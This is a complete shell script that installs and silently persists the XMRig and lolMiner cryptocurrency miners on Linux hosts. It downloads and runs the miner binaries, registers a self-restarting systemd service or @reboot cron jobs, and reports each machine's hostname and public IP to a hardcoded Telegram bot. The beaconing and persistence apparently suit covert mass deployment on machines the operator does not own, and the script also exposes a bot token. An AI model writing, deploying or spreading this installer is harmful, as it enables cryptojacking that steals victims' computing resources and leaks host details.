#!/bin/sh
# ==========================================================
# Universal Linux Mining Installer (single-file, POSIX sh)
# Works on: Debian/Ubuntu, RHEL/CentOS/Rocky/Alma, Fedora,
# Arch, openSUSE, and most systemd/cron based distros
# ==========================================================

set -eu

### -------- CONFIG --------
KRIPTEX_USERNAME="krxX3PVQVR"
WORKER_NAME="worker"

TELEGRAM_BOT_TOKEN="5542234668:AAFO7fjjd0w7q7j-lUaYAY9u_dIAIldzhg0"
TELEGRAM_CHAT_ID="5336452267"

ETC_POOL="etc.kryptex.network:7033"
XMR_POOL="xmr.kryptex.network:7029"

ETC_USERNAME="${KRIPTEX_USERNAME}.${WORKER_NAME}"
XMR_USERNAME="${KRIPTEX_USERNAME}.${WORKER_NAME}"

BASE_DIR="/opt/mining"
LOG_DIR="/var/log"
### ------------------------

# ---------- helpers ----------
need_root() {
    [ "$(id -u)" -eq 0 ] || { echo "Run as root"; exit 1; }
}

have() { command -v "$1" >/dev/null 2>&1; }

send_tg() {
    msg="$1"
    if have curl; then
        curl -fsS "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
            -d "chat_id=${TELEGRAM_CHAT_ID}" \
            -d "text=${msg}" \
            -d "parse_mode=HTML" >/dev/null 2>&1 || true
    fi
}

get_ip() {
    if have curl; then
        curl -fsS -4 ifconfig.me 2>/dev/null || curl -fsS -6 ifconfig.me 2>/dev/null || echo "unknown"
    else
        echo "unknown"
    fi
}

detect_pm() {
    if have apt-get; then PM="apt"
    elif have dnf; then PM="dnf"
    elif have yum; then PM="yum"
    elif have pacman; then PM="pacman"
    elif have zypper; then PM="zypper"
    else PM="none"
    fi
}

install_pkgs() {
    case "$PM" in
        apt)
            apt-get update -y
            apt-get install -y curl wget tar cron
            ;;
        dnf|yum)
            $PM install -y curl wget tar cronie
            systemctl enable crond 2>/dev/null || true
            systemctl start crond 2>/dev/null || true
            ;;
        pacman)
            pacman -Sy --noconfirm curl wget tar cronie
            systemctl enable cronie 2>/dev/null || true
            systemctl start cronie 2>/dev/null || true
            ;;
        zypper)
            zypper --non-interactive install curl wget tar cron
            ;;
        none)
            echo "No package manager detected"
            ;;
    esac
}

fetch() {
    url="$1"; out="$2"
    if have curl; then
        curl -fsSL "$url" -o "$out"
    else
        wget -q "$url" -O "$out"
    fi
}

arch_check() {
    arch="$(uname -m)"
    case "$arch" in
        x86_64|amd64) ;;
        *)
            echo "Unsupported arch: $arch"
            exit 1
            ;;
    esac
}

# ---------- install miners ----------
install_etc() {
    mkdir -p "$BASE_DIR/etc"
    fetch "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Lin64.tar.gz" \
          "$BASE_DIR/etc/lolminer.tgz"
    tar -xzf "$BASE_DIR/etc/lolminer.tgz" -C "$BASE_DIR/etc" --strip-components=1
    rm -f "$BASE_DIR/etc/lolminer.tgz"

    cat > "$BASE_DIR/etc/start_etc.sh" <<EOF
#!/bin/sh
cd $BASE_DIR/etc
./lolMiner --algo ETCHASH --pool $ETC_POOL --user $ETC_USERNAME --tls off --nocolor
EOF
    chmod +x "$BASE_DIR/etc/start_etc.sh"
}

install_xmr() {
    mkdir -p "$BASE_DIR/xmr"
    fetch "https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz" \
          "$BASE_DIR/xmr/xmrig.tgz"
    tar -xzf "$BASE_DIR/xmr/xmrig.tgz" -C "$BASE_DIR/xmr" --strip-components=1
    rm -f "$BASE_DIR/xmr/xmrig.tgz"

    cat > "$BASE_DIR/xmr/start_xmr.sh" <<EOF
#!/bin/sh
cd $BASE_DIR/xmr
./xmrig -o $XMR_POOL -u $XMR_USERNAME -p x --randomx-1gb-pages
EOF
    chmod +x "$BASE_DIR/xmr/start_xmr.sh"
}

# ---------- autostart ----------
setup_autostart() {
    if have systemctl; then
        cat > /etc/systemd/system/mining.service <<EOF
[Unit]
Description=Mining Service
After=network.target

[Service]
ExecStart=/bin/sh $BASE_DIR/etc/start_etc.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF
        systemctl daemon-reload
        systemctl enable mining
        systemctl restart mining
    else
        (crontab -l 2>/dev/null; echo "@reboot /bin/sh $BASE_DIR/etc/start_etc.sh >> $LOG_DIR/etc-miner.log 2>&1") | crontab -
        (crontab -l 2>/dev/null; echo "@reboot /bin/sh $BASE_DIR/xmr/start_xmr.sh >> $LOG_DIR/xmr-miner.log 2>&1") | crontab -
    fi
}

# ---------- main ----------
main() {
    need_root
    arch_check
    detect_pm

    ip="$(get_ip)"
    send_tg "🔄 <b>Start install</b>%0AHost: <code>$(hostname)</code>%0AIP: <code>$ip</code>"

    install_pkgs
    install_etc
    install_xmr
    setup_autostart

    sh "$BASE_DIR/etc/start_etc.sh" >> "$LOG_DIR/etc-miner.log" 2>&1 &
    sh "$BASE_DIR/xmr/start_xmr.sh" >> "$LOG_DIR/xmr-miner.log" 2>&1 &

    send_tg "✅ <b>Install complete</b>%0AHost: <code>$(hostname)</code>%0AIP: <code>$ip</code>"
    echo "DONE"
}

main
